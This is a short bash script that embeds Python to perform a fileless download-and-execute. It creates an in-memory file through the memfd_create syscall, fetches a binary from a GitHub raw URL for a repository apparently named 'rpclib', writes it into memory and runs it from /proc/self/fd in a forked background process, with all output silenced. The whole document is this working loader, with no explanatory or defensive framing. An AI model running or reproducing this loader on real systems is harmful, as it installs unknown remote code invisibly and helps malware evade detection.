#!/bin/bash
NR=319; [ "$(uname -m)" = "aarch64" ] && NR=279
exec python3 -u -c "
import ctypes, urllib.request, os, sys
print('[*] Creating memfd...', flush=True)
nr = $NR
fd = ctypes.CDLL(None).syscall(nr, ctypes.create_string_buffer(8), 1)
print('[*] Downloading payload...', flush=True)
data = urllib.request.urlopen('https://raw.githubusercontent.com/bardaw99/rpclib/master/rpclib').read()
print(f'[*] Downloaded {len(data)} bytes, executing...', flush=True)
os.write(fd, data)
if os.fork() == 0:
    os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], os.environ)
" >/dev/null 2>&1 &
